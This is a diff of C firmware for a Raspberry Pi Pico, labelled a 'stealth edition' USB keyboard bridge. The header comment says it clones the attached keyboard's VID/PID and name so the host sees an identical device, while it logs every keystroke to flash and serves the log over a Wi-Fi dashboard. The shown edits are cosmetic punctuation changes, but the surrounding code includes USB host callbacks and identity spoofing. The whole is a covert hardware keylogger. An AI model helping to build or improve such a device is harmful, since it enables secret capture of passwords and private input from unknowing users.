@@ -1,5 +1,5 @@
-/*
- * MEDIATOR — USB HID Keyboard Bridge (stealth edition)
+﻿/*
+ * MEDIATOR - USB HID Keyboard Bridge (stealth edition)
  *
  * PC sees:   Exact copy of the physical keyboard (spoofed VID/PID/name, HID only)
  * Pico does: Transparently bridge keystrokes + log to flash + serve Wi-Fi dashboard
@@ -35,7 +35,7 @@ static char g_kbd_manufacturer[64] = {0};
 static char g_kbd_product[64]      = {0};
 
 //--------------------------------------------------------------------+
-// Core 1: USB Host task (PIO-USB — timing-critical, must be Core 1)
+// Core 1: USB Host task (PIO-USB - timing-critical, must be Core 1)
 //--------------------------------------------------------------------+
 static void core1_main(void) {
     sleep_ms(10);
@@ -109,7 +109,7 @@ void tud_umount_cb(void)   {}
 void tud_suspend_cb(bool r){ (void)r; }
 void tud_resume_cb(void)   {}
 
-// PC requests report — we only push via IN, nothing to return here
+// PC requests report - we only push via IN, nothing to return here
 uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
                                 hid_report_type_t report_type,
                                 uint8_t *buffer, uint16_t reqlen) {
@@ -139,7 +139,7 @@ static void read_string_desc(uint8_t dev_addr, uint8_t str_idx, char *out, size_
     // We use the cached strings from tuh_string_descriptor after mount
     (void)dev_addr; (void)str_idx;
     // Note: actual string reading happens via tuh_descriptor_get_string_sync
-    // called below — this stub left for clarity
+    // called below - this stub left for clarity
     (void)out; (void)out_len;
 }
 
@@ -151,7 +151,7 @@ void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t instance,
     uint16_t vid = 0, pid = 0;
     tuh_vid_pid_get(dev_addr, &vid, &pid);
 
-    // Force boot protocol — guarantees standard 8-byte keyboard reports
+    // Force boot protocol - guarantees standard 8-byte keyboard reports
     tuh_hid_set_protocol(dev_addr, instance, HID_PROTOCOL_BOOT);
 
     // Update our USB descriptor to spoof this keyboard's identity
